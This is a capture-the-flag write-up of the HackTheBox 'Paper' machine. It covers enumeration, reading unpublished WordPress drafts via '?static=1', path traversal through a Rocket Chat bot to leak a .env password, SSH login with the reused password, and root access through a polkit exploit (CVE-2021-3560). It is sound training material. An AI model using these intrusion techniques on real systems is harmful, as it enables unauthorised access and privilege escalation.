---
draft: false

title: 'HackTheBox — Paper'
date: 2022-02-13

description: 'Comprehensive walkthrough of the Paper machine on HackTheBox'
tags: ['ctf']
---

Hello! Thank you for visiting my write-up on [*Paper*](https://app.hackthebox.com/machines/Paper), a HackTheBox CTF published by user [secnigma](https://app.hackthebox.com/users/92926).

Information as of Sunday, February 13th, 2022 UTC:
 - Release: eight (8) days ago
 - Rating: 4.5 stars
 - Topology: single machine
 - Operating System(s): one (1)

Paper requires the submission of `USER` and `SYSTEM` flags; I have described the process I used to capture both in-depth below.

*Feedback? You can reach me via [email](mailto:contact@swlacy.com?subject=Paper%20Report).*

## Enumeration & Reconnaissance

### Preliminary Information

Paper is a single-machine CTF, for which HackTheBox has already provided the IP address (`10.10.11.143`). For clarity, I have added this address to my hosts file as `paper.htb`. A quick connectivity test:

```
$ ping paper.htb
PING paper.htb (10.10.11.143) 56(84) bytes of data.
64 bytes from paper.htb (10.10.11.143): icmp_seq=1 ttl=63 time=75.5 ms
64 bytes from paper.htb (10.10.11.143): icmp_seq=2 ttl=63 time=75.5 ms
64 bytes from paper.htb (10.10.11.143): icmp_seq=3 ttl=63 time=75.8 ms
64 bytes from paper.htb (10.10.11.143): icmp_seq=4 ttl=63 time=74.5 ms
^C
--- paper.htb ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 74.501/75.324/75.812/0.493 ms

$
```

### Nmap

Let's begin as usual with an NMAP scan on the target; taking some inspiration from [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA), executing [`nmap -sC -sV -oA paper paper.htb`](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+paper+paper.htb) will hopefully reveal some information of interest.

```
$ nmap -sC -sV -oA paper paper.htb
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for paper.htb (10.10.11.143)
Host is up (0.082s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.65 seconds

$
```

It appears that Paper is listening on port 22 for SSH and 80/443 for HTTP/S with an Apache webserver. Further, the Apache headers indicate that the operating system of Paper is CentOS. Navigating to *http://paper.htb* reveals the page below:

![Screenshot of http://paper.htb](/img/paper-1.webp)

Just because the root of the webserver is hosting the CentOS test landing page does not mean that there is no other hosted content, however. To determine whether this is the case, let’s use [Gobuster](https://github.com/OJ/gobuster), a tool designed in part to brute-force web URIs.

### Gobuster

`gobuster dir -u http://paper.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php` performs a brute force directory search on Paper using `GET` requests to reveal any pages with names found in `directory-list-2.3-medium.txt` and which have file extensions of `.html`, `.txt`, or `.php`. The wordlist employed is over 800,000 entries in length, so the completion time against any host will be quite long. In the meantime, other elements may be analyzed — let's return to Gobuster later.

### HTTP Headers

The HTTP response headers, as shown in Firefox when loading assets from *http://paper.htb/\**, are as follows:

```http
HTTP/1.1 200 OK
Date: Sun, 13 Feb 2022 22:47:41 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "283-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 643
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/webp
```

Most of the information here is useless, save for the inclusion of the *X-Backend-Server* header, `office.paper`. Adding `10.10.11.143    office.paper` to my hosts file allowed me to browse to *http://office.paper*, a screenshot of which is shown below:

![Screenshot of http://office.paper](/img/paper-2.webp)

A WordPress site — every red teamer's dream come true! Poking around the website revealed a hint in the form of a user comment:

> Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!

![Screenshot of http://office.paper](/img/paper-3.webp)

In light of that comment, let's check the availability of drafts on *office.paper*. The website *0day.work* [has a post detailing how to view WordPress drafts without authentication](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/) using the `static` keyword. Navigating to http://office.paper/?static=1 allowed viewing the page below, which includes a valuable note.

![Screenshot of http://office.paper](/img/paper-4.webp)

> \# Secret Registration URL of new Employee chat system
>
> http://chat.office.paper/register/8qozr226AhkCHZdyY

Adding *chat.office.paper* to my hosts file and following the link above leads to this page:

![Screenshot of http://chat.office.paper/register/8qozr226AhkCHZdyY](/img/paper-5.webp)

## Obtaining Entry

### Accessing the Secret Rocket Chat Server

Great! We have access to an account creation portal. I generated a new user — `actuallysid@twitter.com` — to log in with. After authenticating, I was added to the `#general` Rocket Chat channel.

![Screenshot of http://chat.office.paper/register/8qozr226AhkCHZdyY](/img/paper-6.webp)

A few of the messages in `#general` stand out to me:

> JIM9334 @ 10:22 AM: hey, did you guys saw DwightKSchrute added a new bot to this channel?
>
> ...
>
> DwightKSchrute @ 10:30 AM: Receptionitis15 Just call the bot by his name and say help. His name is recyclops. For eg: sending "recyclops help" will spawn the bot and he'll tell you what you can and cannot ask him. Now stop wasting my time PAM! I've got work to do!
>
> ...
>
> recyclops <Bot> @ 3:21 PM: kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
> Most frequently asked questions include:
> - What time is it?
> - What new files are in your sales directory?
> - Why did the salesman crossed the road?
> - What's the content of file x in your sales directory? etc.
> Please note that I am a beta version and I still have some bugs to be fixed.
> How to use me ? :
> 1. Small Talk:
> You can ask me how dwight's weekend was, or did he watched the game last night etc.
> eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
> 2. Joke:
> You can ask me Why the salesman crossed the road.
> eg: 'recyclops why did the salesman crossed the road?'
> <=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
> For security reasons, the access is limited to the Sales folder.
> 3. Files:
> eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
> 4. List:
> You can ask me to list the files
> 5. Time:
> You can ask me to what the time is
> eg: 'recyclops what time is it?' or just 'recyclops time'

Evidently, the bot *recyclops* will accept commands passed to it via private message in Rocket Chat. Let's test that functionality. 

![Screenshot of http://chat.office.paper/register/8qozr226AhkCHZdyY](/img/paper-7.webp)

*Sidenote: I love the attention to detail, and creativity of HTB machine publishers — the bot even responded to the joke command. Thank you for your effort, [secnigma](https://secnigma.wordpress.com/)!*

> sid @ 11:48 PM: recyclops what kind of bear is the best?
>
> recyclops <Bot> @ 11:48 PM: That's a ridiculous question

My feelings are irreparably hurt. Moving on, attempting to list the contents of all directories also elicits interesting output from the bot:

> sid @ 11:48 PM: list ../*
>
> recyclops <Bot> @ 11:48 PM: Stop injecting OS commands!

I assume the wildcard was problematic. The help output (`recylops help`) allows for only two security-relevant commands: listing files, (already shown), and requesting files with `file`, which is essentially `cat`. Running `file` on `../hubot/start.sh` reveals the following:

```bash
 <!=====Contents of file ../hubot/start_bot.sh=====>
#!/bin/bash
cd /home/dwight/hubot
source /home/dwight/hubot/.env
/home/dwight/hubot/bin/hubot
#cd -
<!=====End of file ../hubot/start_bot.sh=====>
```

Then, doing the same on the source file `../hubot/.env` prints this:

```bash
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=!REDACTED
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

The credential set for user *recyclops* has been obtained! Note that I have redacted the password in the field above; the actual output contains the real password.

### SSH

Recalling the earlier Nmap scan, port 22 for SSH is open — therefore, let's attempt to log in with the `recyclops` bot credentials.

```text
$ ssh recyclops@paper.htb
The authenticity of host 'paper.htb (10.10.11.143)' can't be established.
ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'paper.htb,10.10.11.143' (ECDSA) to the list of known hosts.
recyclops@paper.htb's password: 
Permission denied, please try again.
```

That didn't work, so I assume `recyclops` is not a system user, only a Rocket Chat user. Since all files in the Rocket Chat directory are owned by user `dwight`, let's try `dwight`:`!REDACTED` instead of `recyclops`:`!REDACTED` over SSH.

```text
$ ssh dwight@paper.htb
dwight@paper.htb's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sun Feb 13 19:07:17 2022 from 10.10.14.134
[dwight@paper ~]$ whoami
dwight
[dwight@paper ~]$
```

It worked — "we're in."

## Flags

Now that we have achieved unrestricted access to `/home/dwight` via SSH, we can explore the file structure.

```text
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
```

Just like that, the `USER` flag has been found!

### USER

```text
[dwight@paper ~]$ cat user.txt
!REDACTED
[dwight@paper ~]$
```
### SYSTEM

```text
[dwight@paper ~]$ sudo -l
[sudo] password for dwight: 
Sorry, user dwight may not run sudo on paper.
[dwight@paper ~]$
```

As `dwight` is not in the `sudoers` file, privilege escalation is required to proceed.

#### CVE-2021-4034

The immediately apparent solution, to me, is the use of [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034), the `pkexec` exploit discovered earlier this year (cve-2021-4034). However, when I tried to compile the exploit, kindly provided by [@bl4sty](https://twitter.com/bl4sty) on [haxx.in](https://haxx.in/exploits/), the process failed.

```text
[dwight@paper .hidden]$ gcc blasty-vs-pkexec2.c
/usr/lib/gcc/x86_64-redhat-linux/8/../../../../lib64/crt1.o: In function '_start':
(.text+0x24): undefined reference to 'main'
collect2: error: ld returned 1 exit status

[dwight@paper .hidden]$
```

I then uploaded the binary, precompiled, using SCP, but it appears that it has been patched on Paper.

```
[dwight@paper .hidden]$ ./blasty-vs-pkexec2
[dwight@paper .hidden]$ # :(
```

#### CVE-2021-3560

However, [a different PolKit exploit written in Python](https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py) *is* functional on Paper:

```
[dwight@paper .hidden]$ python3 a.py
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse 
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit 

...

[+] User Created with the name of ahmed

...

[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

bash: cannot set terminal process group (3090): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper .hidden]#
[root@paper .hidden]# cd /root
[root@paper ~]# cat root.txt 
!REDACTED
[root@paper ~]# 
```

And there it is — the SYSTEM flag! The flag was accepted by HTB; thus, Paper is complete.

After attaining root access, I also attempted privilege escalation using [LinPEAS](https://linpeas.sh), which worked too.

## Conclusion

Paper was a fun and simple CTF, and I extend my thanks towards the author, [secnigma](https://secnigma.wordpress.com/).

https://www.hackthebox.com/achievement/machine/787255/432

![Proof of completion](/img/paper-completion.webp)